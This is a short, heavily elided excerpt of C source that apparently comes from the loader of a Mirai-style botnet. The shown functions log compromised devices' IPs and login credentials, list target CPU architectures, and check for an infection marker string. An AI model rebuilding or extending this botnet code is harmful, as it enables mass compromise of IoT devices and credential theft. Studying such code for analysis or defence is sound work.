...
void connection_close(struct connection *conn)
{
    ...
    if (conn->open)
    {
        ...
        if (conn->success)
        {
            ...
            fprintf(stderr, "\x1b[1;32mOK|%d.%d.%d.%d:%d %s:%s (%s)\033[0m\n",
...
int connection_consume_arch(struct connection *conn)
{
    if (!conn->info.has_arch)
    {
        ...
        /* arm mpsl spc m68k ppc x86 mips sh4 arc */
...
int connection_verify_payload(struct connection *conn)
{
    ...
    if (util_memsearch(conn->rdbuf, offset, "haha kalon yoinked ur device xde", 32) == -1)
        return offset;
    else
        return 255 + offset;
}
